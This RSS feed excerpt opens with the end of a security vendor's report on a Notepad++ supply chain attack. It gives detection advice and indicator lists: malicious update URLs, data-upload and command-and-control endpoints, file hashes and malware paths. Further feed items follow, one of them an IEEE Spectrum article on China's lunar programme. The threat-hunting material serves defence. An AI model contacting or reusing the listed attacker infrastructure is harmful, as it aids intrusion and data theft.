<a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png"><img loading="lazy" decoding="async" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png" alt="" width="2578" height="659" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled.png 2578w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-300x77.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1024x262.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-768x196.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1536x392.png 1536w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-2048x523.png 2048w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1370x350.png 1370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-740x189.png 740w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-1096x280.png 1096w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/03072921/notepad-supply-chain-attack-3-scaled-800x204.png 800w" sizes="auto, (max-width: 2578px) 100vw, 2578px"></a><br>
The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult and at the same time creative task. We would like to propose the following methods, from generic to specific, to hunt down traces of this attack:</p>
<ul>
<li>Check systems for deployments of NSIS installers, which have been used in all three observed execution chains. For example, this can be done by looking for logs related to creations of the <code>%localappdata%\Temp\ns.tmp</code> directory, made by NSIS installers at runtime. Make sure to investigate the origins of each identified NSIS installer to avoid false positives;</li>
<li>Check network traffic logs for DNS resolutions of the temp[.]sh domain, which is unusual to observe in corporate environments. Also, it is beneficial to conduct a check for raw HTTP traffic requests that have a temp[.]sh URL embedded in the user agent — both these steps will make it possible to detect chain #1 and chain #2 deployments;</li>
<li>Check systems for launches of malicious shell commands referenced in the article, such as <code>whoami</code>, <code>tasklist</code>, <code>systeminfo</code> and <code>netstat -ano</code>;</li>
<li>Use specific IoCs listed below to identify known malicious domains and files.</li>
</ul>
<h2 id="indicators-of-compromise">Indicators of compromise</h2>
<p>URLs used for malicious Notepad++ update deployments<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_42031260d3146adf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.32.144.255%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_f6e6bd04c7eb3fc0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.32.144[.]255/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fupdate.exe/?icid=gl_sl_post-opentip_sm-team_4127a336aa8cfcf3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/update.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2finstall.exe/?icid=gl_sl_post-opentip_sm-team_39007ebfc73652d8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/install.exe</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f95.179.213.0%2fupdate%2fautoupdater.exe/?icid=gl_sl_post-opentip_sm-team_55921a0acdd3aea5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://95.179.213[.]0/update/AutoUpdater.exe</a></p>
<p>System information upload URLs<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f45.76.155.202%2flist/?icid=gl_sl_post-opentip_sm-team_f9995f5431a638c6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://45.76.155[.]202/list</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fself-dns.it.com%2flist/?icid=gl_sl_post-opentip_sm-team_be7fc69a991908fe&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://self-dns.it[.]com/list</a></p>
<p>URLs used by Metasploit downloaders to deploy Cobalt Strike beacons<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_f0c164ff6f9fd0c5&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fusers%2fadmin/?icid=gl_sl_post-opentip_sm-team_907a305f6f4d4462&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/users/admin</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fhelp%2fget-start/?icid=gl_sl_post-opentip_sm-team_011c47a252117f96&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/help/Get-Start</a></p>
<p>URLs used by Cobalt Strike Beacons delivered by malicious Notepad++ updaters<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_b23e939d98d1f956&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2f45.77.31.210%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7d59bb41bdeb156b&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://45.77.31[.]210/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_32630cecf516a406&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_9df337d2774186bb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/Metadata/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_dcd0af6bb34cfed4&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/getInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fcdncheck.it.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_7f4b5ffe6e26cb80&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://cdncheck.it[.]com/api/FileUpload/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fresolve/?icid=gl_sl_post-opentip_sm-team_845673fe6ab5d8c3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/resolve</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fsafe-dns.it.com%2fdns-query/?icid=gl_sl_post-opentip_sm-team_94921446150c8e8a&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://safe-dns.it[.]com/dns-query</a></p>
<p>URLs used by the Chrysalis backdoor and the Cobalt Strike Beacon payloads associated with it, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.skycloudcenter.com%2fa%2fchat%2fs%2f70521ddf-a2ef-4adf-9cf0-6d8e24aaa821/?icid=gl_sl_post-opentip_sm-team_9ce93d8d92430d74&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fupdate%2fv1/?icid=gl_sl_post-opentip_sm-team_586b734d80b6d984&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/update/v1</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2ffileupload%2fsubmit/?icid=gl_sl_post-opentip_sm-team_2b9f8ccf1ce1d4eb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/FileUpload/submit</a></p>
<p>URLs related to Cobalt Strike Beacons uploaded to multiscanners, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fuffhxpsy/?icid=gl_sl_post-opentip_sm-team_3fd03c8eefed275e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/uffhxpSy</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fgetbasicinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_9daab5fed98b43ea&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/getBasicInfo/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f59.110.7.32%3a8880%2fapi%2fmetadata%2fsubmit/?icid=gl_sl_post-opentip_sm-team_30d3646339ec7f6e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://59.110.7[.]32:8880/api/Metadata/submit</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2f3yzr31vk/?icid=gl_sl_post-opentip_sm-team_c983bc45ea61bb40&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/3yZR31VK</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2fupdatestatus%2fv1/?icid=gl_sl_post-opentip_sm-team_23af04c4ba5e1df9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/updateStatus/v1</a><br>
<a href="https://opentip.kaspersky.com/http%3a%2f%2f124.222.137.114%3a9999%2fapi%2finfo%2fsubmit/?icid=gl_sl_post-opentip_sm-team_347ca4aa29680b17&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">http://124.222.137[.]114:9999/api/Info/submit</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fusers%2fsystem/?icid=gl_sl_post-opentip_sm-team_b7dac3255e6c443e&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/users/system</a><br>
<a href="https://opentip.kaspersky.com/https%3a%2f%2fapi.wiresguard.com%2fapi%2fgetinfo%2fv1/?icid=gl_sl_post-opentip_sm-team_faac3436712dbc11&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">https://api.wiresguard[.]com/api/getInfo/v1</a></p>
<p>Malicious updater.exe hashes<br>
<a href="https://opentip.kaspersky.com/8e6e505438c21f3d281e1cc257abdbf7223b7f5a/results?icid=gl_sl_post-opentip_sm-team_fc3252034d931e04&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">8e6e505438c21f3d281e1cc257abdbf7223b7f5a</a><br>
<a href="https://opentip.kaspersky.com/90e677d7ff5844407b9c073e3b7e896e078e11cd/results?icid=gl_sl_post-opentip_sm-team_14f98790245926cb&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">90e677d7ff5844407b9c073e3b7e896e078e11cd</a><br>
<a href="https://opentip.kaspersky.com/573549869e84544e3ef253bdba79851dcde4963a/results?icid=gl_sl_post-opentip_sm-team_40e174f1dce982d6&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">573549869e84544e3ef253bdba79851dcde4963a</a><br>
<a href="https://opentip.kaspersky.com/13179c8f19fbf3d8473c49983a199e6cb4f318f0/results?icid=gl_sl_post-opentip_sm-team_6dd7c62c0e6bd7a3&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">13179c8f19fbf3d8473c49983a199e6cb4f318f0</a><br>
<a href="https://opentip.kaspersky.com/4c9aac447bf732acc97992290aa7a187b967ee2c/results?icid=gl_sl_post-opentip_sm-team_889e07a195c9b8cf&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">4c9aac447bf732acc97992290aa7a187b967ee2c</a><br>
<a href="https://opentip.kaspersky.com/821c0cafb2aab0f063ef7e313f64313fc81d46cd/results?icid=gl_sl_post-opentip_sm-team_7f543428bd0bfea0&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">821c0cafb2aab0f063ef7e313f64313fc81d46cd</a></p>
<p>Hashes of malicious auxiliary files<br>
<a href="https://opentip.kaspersky.com/06a6a5a39193075734a32e0235bde0e979c27228/results?icid=gl_sl_post-opentip_sm-team_ff1a7c10c4ae9c07&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">06a6a5a39193075734a32e0235bde0e979c27228</a> — load<br>
<a href="https://opentip.kaspersky.com/9c3ba38890ed984a25abb6a094b5dbf052f22fa7/results?icid=gl_sl_post-opentip_sm-team_ed1b61f041a0a199&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c3ba38890ed984a25abb6a094b5dbf052f22fa7</a> — load<br>
<a href="https://opentip.kaspersky.com/ca4b6fe0c69472cd3d63b212eb805b7f65710d33/results?icid=gl_sl_post-opentip_sm-team_0efb43831626b598&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">ca4b6fe0c69472cd3d63b212eb805b7f65710d33</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/0d0f315fd8cf408a483f8e2dd1e69422629ed9fd/results?icid=gl_sl_post-opentip_sm-team_177bef73d2eb98df&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">0d0f315fd8cf408a483f8e2dd1e69422629ed9fd</a> — alien.ini<br>
<a href="https://opentip.kaspersky.com/2a476cfb85fbf012fdbe63a37642c11afa5cf020/results?icid=gl_sl_post-opentip_sm-team_a38d42b29b7189e9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">2a476cfb85fbf012fdbe63a37642c11afa5cf020</a> — alien.ini</p>
<p>Malicious file hashes, as previously identified by Rapid7<br>
<a href="https://opentip.kaspersky.com/d7ffd7b588880cf61b603346a3557e7cce648c93/results?icid=gl_sl_post-opentip_sm-team_11d36e3202855002&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d7ffd7b588880cf61b603346a3557e7cce648c93</a><br>
94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8<br>
21a942273c14e4b9d3faa58e4de1fd4d5014a1ed<br>
<a href="https://opentip.kaspersky.com/7e0790226ea461bcc9ecd4be3c315ace41e1c122/results?icid=gl_sl_post-opentip_sm-team_296c6f8b3425ef3d&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">7e0790226ea461bcc9ecd4be3c315ace41e1c122</a><br>
<a href="https://opentip.kaspersky.com/f7910d943a013eede24ac89d6388c1b98f8b3717/results?icid=gl_sl_post-opentip_sm-team_d887d29e165f69e8&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">f7910d943a013eede24ac89d6388c1b98f8b3717</a><br>
73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf<br>
<a href="https://opentip.kaspersky.com/bd4915b3597942d88f319740a9b803cc51585c4a/results?icid=gl_sl_post-opentip_sm-team_f2d4cf981d72f7a7&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">bd4915b3597942d88f319740a9b803cc51585c4a</a><br>
<a href="https://opentip.kaspersky.com/c68d09dd50e357fd3de17a70b7724f8949441d77/results?icid=gl_sl_post-opentip_sm-team_cc1d1d4ce7e25394&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">c68d09dd50e357fd3de17a70b7724f8949441d77</a><br>
<a href="https://opentip.kaspersky.com/813ace987a61af909c053607635489ee984534f4/results?icid=gl_sl_post-opentip_sm-team_e9551e01fbf6d9c9&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">813ace987a61af909c053607635489ee984534f4</a><br>
<a href="https://opentip.kaspersky.com/9fbf2195dee991b1e5a727fd51391dcc2d7a4b16/results?icid=gl_sl_post-opentip_sm-team_e8eb540eaf7ac801&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9fbf2195dee991b1e5a727fd51391dcc2d7a4b16</a><br>
<a href="https://opentip.kaspersky.com/07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51/results?icid=gl_sl_post-opentip_sm-team_cb0d7f4d17858453&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51</a><br>
<a href="https://opentip.kaspersky.com/3090ecf034337857f786084fb14e63354e271c5d/results?icid=gl_sl_post-opentip_sm-team_0525022e0722b416&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">3090ecf034337857f786084fb14e63354e271c5d</a><br>
<a href="https://opentip.kaspersky.com/d0662eadbe5ba92acbd3485d8187112543bcfbf5/results?icid=gl_sl_post-opentip_sm-team_1f09cef9aa5e7a47&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">d0662eadbe5ba92acbd3485d8187112543bcfbf5</a><br>
<a href="https://opentip.kaspersky.com/9c0eff4deeb626730ad6a05c85eb138df48372ce/results?icid=gl_sl_post-opentip_sm-team_fc30c07aecbf5645&amp;utm_source=SL&amp;utm_medium=SL&amp;utm_campaign=SL" target="_blank">9c0eff4deeb626730ad6a05c85eb138df48372ce</a></p>
<p>Malicious file paths<br>
%appdata%\ProShow\load<br>
%appdata%\Adobe\Scripts\alien.ini<br>
%appdata%\Bluetooth\BluetoothService</p>
												</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Data centers in space makes no sense (626 pts)]]></title>
            <link>https://civai.org/blog/space-data-centers</link>
            <guid>46876105</guid>
            <pubDate>Tue, 03 Feb 2026 19:37:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://civai.org/blog/space-data-centers">https://civai.org/blog/space-data-centers</a>, See on <a href="https://news.ycombinator.com/item?id=46876105">Hacker News</a></p>
Couldn't get https://civai.org/blog/space-data-centers: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[China Moon Mission: Aiming for 2030 lunar landing (130 pts)]]></title>
            <link>https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis</link>
            <guid>46876047</guid>
            <pubDate>Tue, 03 Feb 2026 19:32:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis">https://spectrum.ieee.org/china-moon-mission-mengzhou-artemis</a>, See on <a href="https://news.ycombinator.com/item?id=46876047">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="NASA’s Rivalry/Not-Rivalry With China’s Space Agency Takes Off"><p>Slow and steady wins the race, or so goes the <a href="https://read.gov/aesop/025.html" rel="noopener noreferrer" target="_blank">fable</a>. The <a href="https://en.cmse.gov.cn/" rel="noopener noreferrer" target="_blank">China Manned Space Agency</a>, or CMSA, has repeatedly denied any rivalry with the <a href="https://spectrum.ieee.org/tag/united-states">United States</a> akin to the race to the <a href="https://spectrum.ieee.org/tag/moon">moon</a> in the 1960s. But step-by-step, one element at a time over a period of decades, it has built a <a href="https://spectrum.ieee.org/china-moon-mission-artemis" target="_self">human space program</a> with goals that include landing <a href="https://spectrum.ieee.org/china-aims-for-a-permanent-moon-base-in-the-2030s" target="_self">astronauts on the moon</a> by <a href="https://global.chinadaily.com.cn/a/202503/03/WS67c55e07a310c240449d8414.html#:~:text=The%20United%20States%20successfully%20made,at%20this%20year's%20two%20sessions?" rel="noopener noreferrer" target="_blank">2030</a> and starting a base there in the following years. And—partly because launch dates for NASA’s <a href="https://spectrum.ieee.org/tag/artemis">Artemis</a> III moon landing keep slipping toward that same time frame—U.S. space leaders are ratcheting up the <a href="https://spectrum.ieee.org/tag/space-race">space race</a> rhetoric.</p><p>“We are in a great competition with a rival that has the will and means to challenge American exceptionalism across multiple domains, including in the high ground of space,” said <a href="https://www.nasa.gov/people/jared-isaacman/" rel="noopener noreferrer" target="_blank">Jared Isaacman</a>, the new head of <a href="https://spectrum.ieee.org/tag/nasa">NASA</a>, in December. “This is not the time for delay, but for action, because if we fall behind—if we make a mistake—we may never catch up, and the consequences could shift the balance of power here on Earth.”</p><p>NASA’s <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_self">Artemis II</a> is almost ready to take its crew on a circumlunar test flight, and the <a href="https://spectrum.ieee.org/tag/white-house">White House</a> has said that U.S. <a href="https://spectrum.ieee.org/tag/astronauts">astronauts</a> should prioritize <a href="https://www.whitehouse.gov/presidential-actions/2025/12/ensuring-american-space-superiority/" rel="noopener noreferrer" target="_blank">a lunar landing by 2028</a>—but could <a href="https://spectrum.ieee.org/tag/china">China</a> slip in ahead? How would a Chinese moon flight work? Does the Chinese space program have technology that matches or beats the United States? </p><p>RELATED: <a href="https://spectrum.ieee.org/artemis-ii-launch-nasa-orion" target="_blank">Inside the Spacecraft That Will Carry Humans Around the Moon</a></p><p>“Nobody [in China] would argue that we are in a space race,” says <a href="https://www.linkedin.com/in/namratagoswami/" rel="noopener noreferrer" target="_blank">Namrata Goswami</a>, a professor at <a href="https://sais.jhu.edu/admissions/masters-program-admissions/how-apply/us-military-and-veteran-applicants/us-space-force-schriever-west-space-scholars-program-ile-sle" rel="noopener noreferrer" target="_blank">Johns Hopkins University</a> who has <a href="https://www.jstor.org/stable/26333878?searchText=au%3A%22Namrata+Goswami%22&amp;searchUri=%2Faction%2FdoBasicSearch%3FQuery%3Dau%253A%2522Namrata%2BGoswami%2522%26so%3Drel&amp;ab_segments=0%2Fbasic_phrase_search%2Fcontrol&amp;refreqid=fastly-default%3A8879f2e0aa2cce8be1737996d10650df&amp;seq=3" rel="noopener noreferrer" target="_blank">written</a> <a href="https://www.google.com/books/edition/Scramble_for_the_Skies/3XsGEAAAQBAJ?hl=en&amp;gbpv=1" rel="noopener noreferrer" target="_blank">extensively</a> about China’s space effort, “but they might be engaged in activity that showcases China as a space power, and they are very serious about getting somewhere first.”</p><h2>What Are the Mengzhou and Lanyue Spacecraft?</h2><p>China’s <a href="https://www.cmse.gov.cn/xwzx/yzjz/202003/t20200331_45264.html" rel="noopener noreferrer" target="_blank">lunar hardware</a> builds on existing engineering. It is based on a multipurpose crew ship called <a href="https://news.cgtn.com/news/2025-11-01/China-s-2026-space-mission-lineup-Mengzhou-1-Long-March-10A-to-debut-1HWYMJGSIkE/p.html" rel="noopener noreferrer" target="_blank">Mengzhou</a>, with capacity for <a href="https://www.space-agencies.com/2025/10/08/mengzhou-chinas-next-crewed-lunar-spacecraft/" rel="noopener noreferrer" target="_blank">six or seven astronauts</a>, though as few as three may actually fly on a trip from Earth to low lunar orbit. (China watchers dispense with the word “taikonaut” for its crew members, by the way; <a href="https://science.thewire.in/the-sciences/infinite-in-all-directions-a-science-workshop-and-why-vyomanaut-is-not-cool/" rel="noopener noreferrer" target="_blank">the word was coined in 1998</a> and has not been used by the Chinese government itself. China generally uses the word <a href="https://www.oxfordreference.com/display/10.1093/oi/authority.20110803101916587" rel="noopener noreferrer" target="_blank"><em><em>yuhangyuan</em></em></a>, roughly translated as “traveler of the universe.”)</p><p>Mengzhou, according to what the CMSA has shown, includes a crew section in the shape of a truncated cone or <a href="https://mathworld.wolfram.com/Frustum.html" rel="noopener noreferrer" target="_blank">frustum</a>, with a <a href="https://www.universetoday.com/articles/china-names-its-capsule-and-lander-for-its-upcoming-human-lunar-missions#:~:text=According%20to%20Chinese%20state%20media%2C%20the%20Mengzhou%20spacecraft&amp;text=In%20addition%20to%20this%2C%20there%20will%20be,module%20that%20is%20home%20to%20power%20and" rel="noopener noreferrer" target="_blank">service module</a> holding power and propulsion systems in the rear. If you squint at it, you’ll see a resemblance to the American <a href="https://images.nasa.gov/details/art001e000415" rel="noopener noreferrer" target="_blank">Artemis</a> or <a href="https://images.nasa.gov/details/as15-88-11974" rel="noopener noreferrer" target="_blank">Apollo</a> spacecraft, the <a href="https://spectrum.ieee.org/tag/spacex">SpaceX</a> <a href="https://images.nasa.gov/details/KSC-20180520-PH_SPX01_0001" rel="noopener noreferrer" target="_blank">Crew Dragon</a>, or the yet-to-be-flown European <a href="https://spectrum.ieee.org/spacex-competitors" target="_self">Nyx</a>. Basic <a href="https://spectrum.ieee.org/tag/aerodynamics">aerodynamics</a> make a blunt cone a very efficient shape for safely launching a spacecraft and returning it through Earth’s atmosphere.</p><p> <img alt="A crewed spacecraft with deployed parachutes gently descends back to Earth." data-rm-shortcode-id="ef24a46bc3a70dd031b26d5a963d0b72" data-rm-shortcode-name="rebelmouse-image" data-runner-src="https://spectrum.ieee.org/media-library/a-crewed-spacecraft-with-deployed-parachutes-gently-descends-back-to-earth.jpg?id=63413486&amp;width=980" height="1500" id="a72d9" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/a-crewed-spacecraft-with-deployed-parachutes-gently-descends-back-to-earth.jpg?id=63413486&amp;width=980" width="2000"> <small placeholder="Add Photo Caption...">The Mengzhou command ship uses parachutes and airbags during a 2025 landing test in northwest China.</small><small placeholder="Add Photo Credit...">Wang Heng/Xinhua/Getty Images</small></p><p>Mengzhou is billed as reusable, with an outer heat shield that can be replaced after flight. Landings would take place in China’s western desert. “Coupled with the landing method of airbag cushioning,” says the CMSA in a <a href="https://www.cmse.gov.cn/xwzx/yzjz/202003/t20200331_45264.html" target="_blank">translated statement</a>, “the spacecraft itself can be better protected from damage and allow the reuse of the spacecraft.”</p><p>The ship would be launched by a new heavy-lift <a href="https://english.www.gov.cn/news/202508/15/content_WS689eec3dc6d0868f4e8f4dcb.html" target="_blank">Long March 10 booster</a>, one of two used for a given moon mission. The Long March 10, as configured for lunar flight, would stand 92.5 meters high at launch and generate thrust of 2,678 tonnes. (The <a href="https://www.nasa.gov/reference/space-launch-system/" target="_blank">rocket for Artemis II</a> is more powerful: 3,992 tonnes.)</p><p>Mengzhou would leave for the moon after another Long March 10 has launched a <a href="https://spectrum.ieee.org/tag/lunar-landing">lunar landing</a> craft called <a href="https://www.chinadaily.com.cn/a/202402/24/WS65d9506aa31082fc043b8df2.html" target="_blank">Lanyue</a>. The two would rendezvous and dock in lunar orbit. Two astronauts would transfer to Lanyue and land on the moon’s surface; Mengzhou would wait for them in orbit for the trip home. Lanyue has a stated mass of 26 tonnes and could carry a 200-kilogram rover.</p><p>Chinese authorities <a href="https://www.rand.org/pubs/commentary/2025/11/china-is-going-to-the-moon-by-2030-heres-whats-known.html#:~:text=Officials%20envisage%20two%20versions%20initially,the%20lunar%20surface%20in%202030." rel="noopener noreferrer" target="_blank">say</a> testing of Lanyue began in 2024. Mengzhou should go on its first robotic flight in 2026; Lanyue, in 2027. The first joint test mission is planned for 2028 or 2029, with the first crew going to the moon a year after that.</p><h2>What Is China’s Long-Term Plan for Space?</h2><p>But to focus on their hardware is to miss out on a major difference between the Chinese and U.S. moon-landing efforts. Artemis is the product of a start-again stop-again debate that’s been going on in the U.S. government since <a href="https://spectrum.ieee.org/tag/apollo">Apollo</a> ended in the 1970s. Goals have shifted repeatedly—often when new presidents took office. Conversely, the <a href="https://spectrum.ieee.org/taikonauts-prepare-for-liftoff" target="_self">Chinese campaign</a> is the outgrowth of a plan called <a href="https://english.cas.cn/newsroom/archive/china_archive/cn2003/200909/t20090923_40427.shtml" rel="noopener noreferrer" target="_blank">Project 921</a>, first backed by the Chinese Communist Party in 1992. There have been updates and some technical setbacks, but China has pretty much stuck to it ever since.</p><p>“What the Chinese space effort has done that others have not is integrate everything,” says Goswami. “It’s not just ‘We’re going to mount a mission.’ It’s bigger than that. They view space as an activity and not missions.”</p><p>In other words, she says, each new piece of technology is part of a coordinated effort to create a <a href="https://spectrum.ieee.org/could-china-get-to-mars-first" target="_self">sustained presence in space</a>, which pays <a href="https://thediplomat.com/2021/05/china-moves-toward-a-permanent-space-presence/" rel="noopener noreferrer" target="_blank">economic, geopolitical, and sometimes military dividends</a>. Each part, so far, has fit together with other parts: The first orbiting capsule, called <a 